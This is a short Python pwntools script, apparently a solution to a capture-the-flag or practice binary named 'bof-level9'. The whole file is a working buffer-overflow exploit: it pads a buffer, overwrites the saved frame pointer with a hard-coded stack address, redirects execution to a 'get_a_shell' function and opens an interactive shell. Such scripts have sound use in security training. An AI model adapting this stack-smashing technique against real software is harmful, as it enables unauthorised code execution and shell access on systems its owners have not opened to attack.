#!/usr/bin/env python

from pwn import *

context.terminal = "/bin/bash"

c = Core('./core')

e = ELF("./bof-level9")
addr_of_get_a_shell = e.symbols['get_a_shell']

target_ebp = p32(0xffffc4dc)

buf = p32(addr_of_get_a_shell) + 'A' * (0x80 - 0x8) + target_ebp
buffer_addr = c.stack.find(buf)

p = process('./bof-level9')
#gdb.attach(p)
p.send(buf)
p.interactive()
